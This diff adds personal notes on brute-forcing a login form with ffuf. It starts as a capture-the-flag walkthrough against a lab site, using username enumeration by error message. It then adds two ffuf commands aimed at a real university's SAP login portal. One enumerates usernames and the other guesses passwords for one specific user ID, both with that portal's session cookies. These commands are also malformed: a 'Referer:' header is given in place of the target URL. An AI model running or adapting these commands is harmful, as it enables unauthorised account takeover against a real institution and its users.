@@ -1,0 +1,40 @@
+Brute Force
+
+Visiting the /cpadmin directory you'll be redirected to /cpadmin/login which contains a login form which accepts a username and password. If you view the HTML source you'll see to input fields with the name username and password.
+
+If you try entering a test username and password such as test / test you'll be presented with an error message saying "Username is invalid" when a form produces username errors this gives us the opportunity to launch a brute force attack to try and discover a valid username. The below command contains the -fr switch which means it will only display results that don't contain the proceeding text.
+
+
+ffuf -w Downloads/wordlists/usernames.txt -X POST -d "username=FUZZ&password=x" -t 9 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnpPRzV3ZG1VMGFpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJmMmZlZjI5MWI5ZjJlNWE1YjRkMjBjZTgwNzRlZTY1ZCJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -fr 'Username is invalid'
+
+
+ffuf -w Downloads/wordlists/usernames.txt -X POST -d "username=FUZZ&password=x" -t 9 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnpPRzV3ZG1VMGFpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJmMmZlZjI5MWI5ZjJlNWE1YjRkMjBjZTgwNzRlZTY1ZCJ9" -u http://www.vulnbegin.co.uk/cpadmin/login -fr 'Username is invalid'
+
+
+
+ffuf -w Downloads/wordlists/usernames.txt -X POST -d "username=FUZZ&password=SAN@308ap" -t 3 -p 0.1 -H "Cookie: com.sap.engine.security.authentication.original_application_url=GET#wVUYK8iUqx5MKpMgVcGNbbRUh%2BXIVSYKnSmW5OjHqRXjuTJukNjLZTIT5VI3YEPUQvI0zn7lyR06b5Ro6WsbdE%2F9NzUsl%2F%2BBCpTiCaqwBqgPqhcXUCs7Jw%3D%3D" -H "cookie: PortalAlias=portal" -H "Cookie: saplb_*=(J2EE3967220)3967251" -H "Cookie:JSESSIONID=BP2dlQk6qA8DiDIP_Ns8qKsYtuAMhgETiTwA_SAPsA2rnJsiTFhK7BJfA3MLZHKV" -H "Content-Type: application/x-www-form-urlencoded" -u Referer: https://kiitportal.kiituniversity.net/irj/portal/ -fr 'User authentication failed'
+
+
+ffuf -w Downloads/wordlists/passwords.txt -X POST -d "username=2005825&password=FUZZ" -t 1 -p 0.1 -H "Cookie: com.sap.engine.security.authentication.original_application_url=GET#wVUYK8iUqx5MKpMgVcGNbbRUh%2BXIVSYKnSmW5OjHqRXjuTJukNjLZTIT5VI3YEPUQvI0zn7lyR06b5Ro6WsbdE%2F9NzUsl%2F%2BBCpTiCaqwBqgPqhcXUCs7Jw%3D%3D" -H "cookie: PortalAlias=portal" -H "Cookie: saplb_*=(J2EE3967220)3967251" -H "Cookie:JSESSIONID=BP2dlQk6qA8DiDIP_Ns8qKsYtuAMhgETiTwA_SAPsA2rnJsiTFhK7BJfA3MLZHKV" -H "Content-Type: application/x-www-form-urlencoded" -u Referer: https://kiitportal.kiituniversity.net/irj/portal/ -fr 'User authentication failed'
+
+inspect -> Network -> post -> request header -> cookie
+    {
+        "name": "ctfchallenge",
+        "value": "eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnpPRzV3ZG1VMGFpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJmMmZlZjI5MWI5ZjJlNWE1YjRkMjBjZTgwNzRlZTY1ZCJ9",
+        "domain": ".vulnbegin.co.uk",
+        "hostOnly": false,
+        "path": "/",
+        "secure": false,
+        "httpOnly": false,
+        "sameSite": "no_restriction",
+        "session": false,
+        "firstPartyDomain": "",
+        "partitionKey": null,
+        "expirationDate": 1677824755,
+        "storeId": null
+    }
+]
+
+inspect -> Network -> post -> request header -> Content-Type
+Content-Type
+    application/x-www-form-urlencoded
